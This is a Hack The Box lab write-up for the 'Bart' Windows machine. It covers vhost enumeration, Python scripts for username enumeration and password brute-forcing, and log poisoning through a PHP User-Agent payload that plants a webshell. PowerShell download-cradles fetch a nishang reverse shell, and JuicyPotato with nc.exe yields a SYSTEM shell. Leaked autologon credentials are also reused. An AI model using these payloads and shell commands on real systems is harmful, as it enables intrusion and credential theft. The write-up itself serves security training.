## Default Information
IP Address: 10.10.10.81\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.81  bart.htb
```
### Rustscan
Firstly, we will use rustscan to identify the open ports (NOTE: rustscan will not detect the open port 3000)

```
Open 10.10.10.81:80
```

### Nmap
We will then use the open ports obtained from rustscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80 | http | Microsoft IIS httpd 10.0 | Open |

### Web Enumeration on http://bart.htb
Using gobuster to enumerate http://bart.htb, we are unable to find any potential endpoints. However, using gobuster to enumerate the vhosts on http://bart.htb, we are able to obtain 2 results.

```
forum
monitor
```

Now, we will add the 2 vhosts to the ```/etc/hosts``` file. 

```
10.10.10.81 forum.bart.htb monitor.bart.htb bart.htb
```

Next, we will enumerate the endpoints on http://bart.htb again. This time round we are able to find a few endpoints on http://bart.htb

```
http://bart.htb/forum                (Status: 301) [Size: 145] [--> http://bart.htb/forum/]
http://bart.htb/monitor              (Status: 301) [Size: 147] [--> http://bart.htb/monitor/]
http://bart.htb/Forum                (Status: 301) [Size: 145] [--> http://bart.htb/Forum/]
http://bart.htb/Monitor              (Status: 301) [Size: 147] [--> http://bart.htb/Monitor/]
http://bart.htb/MONITOR              (Status: 301) [Size: 147] [--> http://bart.htb/MONITOR/]
```

### Web Enumeration of http://forum.bart.htb
The gobuster enumeration of http://forum.bart.htb did not produce any output, but we realized that http://bart.htb/forum, http://bart.htb/Forum and http://forum.bart.htb are all the same page.

Apart from that, we also realize that visiting http://bart.htb redirects us to http://forum.bart.htb. Inspecting the source code at http://forum.bart.htb/#pg-8-3, we are able to find a list of emails which might come in handy later.

```
s.brown@bart.local
d.simmons@bart.htb
r.hilton@bart.htb
h.potter@bart.htb
info@bart.htb
```

### Web Enumeration of http://monitor.bart.htb
Using gobuster to enumerate the endpoints on http://monitor.bart.htb, we are able to find a few endpoints. However, navigating to these endpoints we are generally unable to access these endpoints.

```
http://monitor.bart.htb/docs                 (Status: 301) [Size: 152] [--> http://monitor.bart.htb/docs/]
http://monitor.bart.htb/static               (Status: 301) [Size: 154] [--> http://monitor.bart.htb/static/]
http://monitor.bart.htb/src                  (Status: 301) [Size: 151] [--> http://monitor.bart.htb/src/]
http://monitor.bart.htb/vendor               (Status: 301) [Size: 154] [--> http://monitor.bart.htb/vendor/]
http://monitor.bart.htb/Docs                 (Status: 301) [Size: 152] [--> http://monitor.bart.htb/Docs/]
http://monitor.bart.htb/cron                 (Status: 301) [Size: 152] [--> http://monitor.bart.htb/cron/]
http://monitor.bart.htb/DOCS                 (Status: 301) [Size: 152] [--> http://monitor.bart.htb/DOCS/]
http://monitor.bart.htb/Static               (Status: 301) [Size: 154] [--> http://monitor.bart.htb/Static/]
http://monitor.bart.htb/SRC                  (Status: 301) [Size: 151] [--> http://monitor.bart.htb/SRC/]
```

Navigating to http://monitor.bart.htb/?action=forgot, we realize that we can use it to find the usernames that can be found on the website. Trying out the list of emails that we have found earlier, we realized that the list of emails are invalid on this website. 

![Finding list of invalid usernames](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/invalid_email.png)

Next, we will write a script to check for valid usernames using the list from [here](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/familynames-usa-top1000.txt).

```
┌──(kali㉿kali)-[~/Desktop/bart]
└─$ python3 enumerate_usernames.py
[+] Obtained CSRF value: 958f847a477fb001d1e0ede082fc6ff65aec2a6bca75506d6821e2fae68b72b6
Username found ===> HARVEY
Username found ===> DANIEL
```

Next, let us generate a short list of password from http://forum.bart.htb using cewl

```
┌──(kali㉿kali)-[~/Desktop/bart]
└─$ cewl -w password.txt -e -a http://forum.bart.htb
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

Lastly, we will use a script to enumerate the credentials for both harvey and daniel. Form the output, we are able to find the credentials for HARVEY but not DANIEL.

```
┌──(kali㉿kali)-[~/Desktop/bart]
└─$ python3 enumerate_creds.py
Obtained CSRF value: cf6117793e3557a2a95f13422dd26c4e6d38211e995e0422e6f4e1f6826d7abf
[+] Enumerating passwords for HARVEY
Credentials found =====> HARVEY:potter
Obtained CSRF value: 9c72432c3b77c10ba745eca94ff4e867e0aea4b00fca15a213e5f4882d445b6c
[+] Enumerating passwords for DANIEL
```

Navigating to http://monitor.bart.htb/?&mod=server, we are able to find another domain which is http://internal-01.bart.htb/. We will then add http://internal-01.bart.htb/ to our /etc/hosts file. 

```
10.10.10.81 internal-01.bart.htb forum.bart.htb monitor.bart.htb bart.htb
```

### Web Enumeration of http://internal-01.bart.htb
Next, let us run a gobuster enumeration on http://internal-01.bart.htb

```
http://internal-01.bart.htb/index.php            (Status: 302) [Size: 4] [--> simple_chat/login_form.php]
http://internal-01.bart.htb/log                  (Status: 301) [Size: 155] [--> http://internal-01.bart.htb/log/]
http://internal-01.bart.htb/Index.php            (Status: 302) [Size: 4] [--> simple_chat/login_form.php]
http://internal-01.bart.htb/sql                  (Status: 301) [Size: 155] [--> http://internal-01.bart.htb/sql/]
http://internal-01.bart.htb/INDEX.php            (Status: 302) [Size: 4] [--> simple_chat/login_form.php]
http://internal-01.bart.htb/SQL                  (Status: 301) [Size: 155] [--> http://internal-01.bart.htb/SQL/]
http://internal-01.bart.htb/Log                  (Status: 301) [Size: 155] [--> http://internal-01.bart.htb/Log/]
```

Navigating to http://internal-01.bart.htb, we realize that we are being redirected to http://internal-01.bart.htb/simple_chat/login.php. Let us run gobuster enumeration on http://internal-01.bart.htb/simple_chat

```
http://internal-01.bart.htb/simple_chat/media                (Status: 301) [Size: 169] [--> http://internal-01.bart.htb/simple_chat/media/]
http://internal-01.bart.htb/simple_chat/index.php            (Status: 302) [Size: 0] [--> ../]
http://internal-01.bart.htb/simple_chat/login.php            (Status: 302) [Size: 0] [--> login_form.php]
http://internal-01.bart.htb/simple_chat/register.php         (Status: 302) [Size: 0] [--> register_form.php]
http://internal-01.bart.htb/simple_chat/chat.php             (Status: 302) [Size: 4] [--> simple_chat/login_form.php]
http://internal-01.bart.htb/simple_chat/css                  (Status: 301) [Size: 167] [--> http://internal-01.bart.htb/simple_chat/css/]
http://internal-01.bart.htb/simple_chat/Index.php            (Status: 302) [Size: 0] [--> ../]
http://internal-01.bart.htb/simple_chat/includes             (Status: 301) [Size: 172] [--> http://internal-01.bart.htb/simple_chat/includes/]
http://internal-01.bart.htb/simple_chat/Login.php            (Status: 302) [Size: 0] [--> login_form.php]
http://internal-01.bart.htb/simple_chat/js                   (Status: 301) [Size: 166] [--> http://internal-01.bart.htb/simple_chat/js/]
http://internal-01.bart.htb/simple_chat/logout.php           (Status: 302) [Size: 0] [--> ../]
http://internal-01.bart.htb/simple_chat/Media                (Status: 301) [Size: 169] [--> http://internal-01.bart.htb/simple_chat/Media/]
http://internal-01.bart.htb/simple_chat/Register.php         (Status: 302) [Size: 0] [--> register_form.php]
http://internal-01.bart.htb/simple_chat/login_form.php       (Status: 200) [Size: 1407]
http://internal-01.bart.htb/simple_chat/Chat.php             (Status: 302) [Size: 4] [--> simple_chat/login_form.php]
http://internal-01.bart.htb/simple_chat/INDEX.php            (Status: 302) [Size: 0] [--> ../]
http://internal-01.bart.htb/simple_chat/CSS                  (Status: 301) [Size: 167] [--> http://internal-01.bart.htb/simple_chat/CSS/]
http://internal-01.bart.htb/simple_chat/JS                   (Status: 301) [Size: 166] [--> http://internal-01.bart.htb/simple_chat/JS/]
http://internal-01.bart.htb/simple_chat/Logout.php           (Status: 302) [Size: 0] [--> ../]
http://internal-01.bart.htb/simple_chat/MEDIA                (Status: 301) [Size: 169] [--> http://internal-01.bart.htb/simple_chat/MEDIA/]
http://internal-01.bart.htb/simple_chat/Includes             (Status: 301) [Size: 172] [--> http://internal-01.bart.htb/simple_chat/Includes/]
http://internal-01.bart.htb/simple_chat/LogIn.php            (Status: 302) [Size: 0] [--> login_form.php]
http://internal-01.bart.htb/simple_chat/LOGIN.php            (Status: 302) [Size: 0] [--> login_form.php]
```

The http://internal-01.bart.htb/simple_chat/register_form.php looks promising, but we realize that we are redirected to the login_form.php whenever we navigate to the url. 

Looking up ```Internal Chat Login Form```, we are able to find the source code from [github](https://github.com/magkopian/php-ajax-simple-chat)

Looking at the source code of register.php, we are able to find out the parameters used to register a new user

```
//check if username is provided
if (!isset($_POST['uname']) || empty($_POST['uname'])) {
	$errors['uname'] = 'The Username is required';
} else {
	//validate username
	if (($uname = validate_username($_POST['uname'])) === false) {
		$errors['uname'] = 'The Username is invalid';
	}
}

//check if password is provided
if (!isset($_POST['passwd']) || empty($_POST['passwd'])) {
	$errors['passwd'] = 'The Password is required';
} else {
	//validate password
	
	if (($passwd = validate_password($_POST['passwd'])) === false) {
		$errors['passwd'] = 'The Password must be at least 8 characters';
	}
}
```

Next, we will send a POST request to http://internal-01.bart.htb to register a new user

![Registering a new user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/new_user.png)

Using the credentials test1:testtest1, we are then able to login to the Internal Dev Chat from http://internal-01.bart.htb/simple_chat/login_form.php

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=test1&passwd=testtest1"
```

![Internal Dev Chat](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/internal_dev_chat.png)

## Exploit
### Log poisoning
Looking at the source code, we realize that there is a Javascript that will send a GET request to http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey

```
function saveChat() {
	// create a serialized object and send to log_chat.php. Once done hte XHR request, alert "Done"
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);
        }
	}
	xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
	xhr.send(null);
	alert("Done");
}
```

Navigating to http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey, we are only returned a page that shows ```1```

![log.php for harvey](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/log_php.png)

Navigating to http://internal-01.bart.htb/log/log.txt allows us to view all the log files with the User-Agent. 

![Viewing all the logs](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/logs.png)

This might mean that we are able to do log poisoning attack via the User-Agent. To do so, we will first test it out have to modify the User-Agent header to become ```<?php phpinfo();?>``` when we send a GET request to http://internal-01.bart.htb/log/log.php?filename=phpinfo.php&username=harvey

![Log Poisoning](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/log_poisoning.png)

Afterwards, we will navigate to http://internal-01.bart.htb/log/phpinfo.php and we will be able to view the phpinfo page.

![phpinfo page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/phpinfo.png)

### Obtaining Reverse shell
Firstly, we have to exploit the log poisoning attack to create a webshell at cmd.php
![Creating a webshell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/webshell.png)

Executing the ```whoami``` command at http://internal-01.bart.htb/log/cmd.php?cmd=whoami then returns an output

![whoami](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bart/whoami.png)

Next, we will have to modify the Invoke-PowershellTcp.ps1 script from nishang and add the following lines to the bottom of the script

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.6 -Port 4000 
```

Navigating to http://internal-01.bart.htb/log/cmd.php?cmd=powershell.exe%20-c%20%22iex%20((New-Object%20System.Net.WebClient).DownloadString(%27http://10.10.16.6:3000/Invoke-PowerShellTcp.ps1%27))%22 will then spawn the reverse shell connection

### Privilege Escalation to SYSTEM
Looking at the privilges that we have in C:\Users, we will probably need to escalate our privileges to SYSTEM privileges to be able to read the user flag and the root flag.

Currently, we do not have the required privileges to read any of the files in C:\Users directory and so we are unable to obtain the user flag.
```
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----       04/02/2018     21:58                Administrator                 
d-----       02/10/2017     13:08                DefaultAppPool                
d-----       04/10/2017     08:40                forum.bart.local              
d-----       17/01/2022     16:40                h.potter                      
d-----       24/09/2017     21:55                Harvey Potter                 
d-----       04/02/2018     21:56                internal.bart.local           
d-----       04/10/2017     08:42                monitor.bart.local            
d-----       06/02/2018     10:15                privileged                    
d-r---       21/02/2018     21:45                Public                        
d-----       02/10/2017     13:08                test  
```

### Escalation to SYSTEM privileges
When attempting to execute PowerUp.ps1 script on this machine, we realize that the script execution policy is being disabled on this machine and we are unable to import the module for the PowerUp.ps1 script. To counter that, we will use the ```-nop``` argument for powershell.exe when we transfer files.

```
powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.6:3000/PowerUp.ps1');Invoke-AllChecks"
```

Looking at the output for PowerUp.ps1 script, we realize that the SeImpersonatePrivilege is enabled. This might mean that the machine is vulnerable to the Juicy Potato exploit. 

Running ```systeminfo``` to check the current version of Windows that we are running on, we can see that we are using Windows 10 Pro which is a version of Windows that is vulnerable to the Juicy Potato exploit.

```
Host Name:                 BART
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.15063 N/A Build 15063
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
```

Now all we have to do is to tranfer the Juicy Potato executable and nc.exe to our Windows server. Using ```{5B3E6773-3A99-4A3D-8096-7765DD11785C}``` as the CLSID, we can then execute a reverse shell connection with SYSTEM privileges

```
PS C:\temp> ./JuicyPotato.exe -l 1337 -p "c:\windows\system32\cmd.exe" -a "/c C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -> recv failed with error: 10038
PS C:\temp> ./JuicyPotato.exe -l 1337 -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}" -p "c:\windows\system32\cmd.exe" -a "/c C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000" -t *
Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 1337
......
[+] authresult 0
{5B3E6773-3A99-4A3D-8096-7765DD11785C};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
--------------------------------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 2000           
listening on [any] 2000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.81] 49747
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
C:\Windows\system32>
```

### Obtaining user flag

```
C:\Users\h.potter\Desktop>type user.txt
type user.txt
<Redacted user text>
```

### Obtaining root flag

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```
## Post-Exploitation
### Script used to enumerate usernames

```python3
import requests
from bs4 import BeautifulSoup

def getUsernames():
    usernamelist = open("usernames.txt").readlines()
    usernames = []
    for username in usernamelist:
        username = username.strip()
        usernames.append(username)
    return usernames

def checkUsername():
    usernames = getUsernames()
    url = "http://monitor.bart.htb/?action=forgot"
    s = requests.Session()
    r = s.get(url)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf_value = soup.find('input',{'name':'csrf'}).get('value')
    print("[+] Obtained CSRF value: {csrf_value}".format(csrf_value=csrf_value))
    for username in usernames:
        data = {'csrf': csrf_value, 'user_name':username}
        resp = s.post(url, data=data)
        if "The provided username could not be found." in resp.text:
            continue
        else:
            print("Username found ===> {username}".format(username=username))
if __name__ == '__main__':
    checkUsername()
```

### Script used to enumerate credentials

```python3
import requests
from bs4 import BeautifulSoup

def getPasswords():
    password_file = open("passwords.txt").readlines()
    passwords = []
    for password in password_file:
        password = password.strip()
        passwords.append(password)
    return passwords

def checkCredentials():
    passwords = getPasswords()
    url = "http://monitor.bart.htb/?"
    s = requests.Session()
    r = s.get(url)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf_value = soup.find('input',{'name':'csrf'}).get('value')
    print("Obtained CSRF value: {csrf_value}".format(csrf_value=csrf_value))
    usernames = ['harvey','daniel']
    for username in usernames:
        print("[+] Enumerating passwords for {username}".format(username=username))
        for password in passwords:
            data = {'csrf':csrf_value,'user_name':username,'user_password':password,'action':'login'}
            resp = s.post(url, data=data)
            if 'The information is incorrect.' not in resp.text:
                print("Credentials found =====> {username}:{password}".format(username=username,password=password))

if __name__ == '__main__':
    checkCredentials()
```

### Privilege Escalation via autologon credentials
Another way that we can achieve privilege escalation is via the autologon credentials. Using winPEAS, we are able to find some autologon credentials with the DefaultDomainName, DefaultUserName and the DefaultPassword.

```
???????????? Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  DESKTOP-7I3S68E
    DefaultUserName               :  Administrator
    DefaultPassword               :  3130438f31186fbaf962f407711faddb
```

One way to exploit this autologon credentials is to use the autologon credentials to gain access to the privileged file system

```
PS C:\temp> net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
The command completed successfully.

PS C:\temp> whoami
nt authority\iusr
PS C:\temp> x:
PS X:\> cd Users/Administrator/Desktop
PS X:\Users\Administrator\Desktop> type root.txt
f05b75ad811c2e1f5f53720a90d4d055
PS X:\Users\Administrator\Desktop> 
```

Another way to exploit the autologon credentials is to use the "run as" commands in powershell. In the exploit the shell.ps1 script will be the same Invoke-PowerShellTcp.ps1 script that we have downloaded from Nishang.

```
PS C:\temp> $username = "BART\Administrator"
PS C:\temp> $password = "3130438f31186fbaf962f407711faddb"
PS C:\temp> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\temp> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\temp> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\temp> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:3000/shell.ps1') } -Credential $cred -Computer localhost
```

Another way of finding the autologon credentials is by querying the registry to find the credentials using reg.exe. However, we realize that running ```reg.exe query``` here does not rebeal the autologon credentials at all. 

```
PS C:\Windows\System32> reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    
    EnableSIHostIntegration    REG_DWORD    0x1
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
```

This is due to the fact that the shell is being loaded as a 32 Bit environment even though the machine is a 64 Bit one (I have no idea why this is happening though). 

```
PS C:\inetpub\wwwroot\internal-01\log> [Environment]::Is64BitProcess
False
```
